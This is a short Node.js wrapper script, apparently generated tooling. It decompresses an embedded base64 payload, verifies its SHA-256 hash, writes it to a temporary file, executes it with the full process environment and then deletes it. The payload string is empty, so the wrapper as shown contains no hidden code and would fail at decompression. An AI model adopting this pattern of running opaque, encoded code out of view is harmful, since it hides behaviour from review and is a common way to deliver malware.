import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import crypto from "node:crypto";
import zlib from "node:zlib";
import { execFileSync } from "node:child_process";

const work = process.argv[2];
if (!work) throw new Error("session-security wrapper: source directory is required");

const source = zlib.gunzipSync(Buffer.from("", "base64"));
const actual = crypto.createHash("sha256").update(source).digest("hex");
const expected = "76277776af9b2adf29a52c75cd433d99c367e23e98da49326ddcfaf736bf8242";
if (actual !== expected) throw new Error("session-security wrapper: payload hash mismatch");

const temp = path.join(os.tmpdir(), `transsalomao-session-security-${process.pid}.mjs`);
fs.writeFileSync(temp, source);
try {
  execFileSync(process.execPath, [temp, work], { cwd: process.cwd(), stdio: "inherit", env: process.env });
} finally {
  fs.rmSync(temp, { force: true });
}
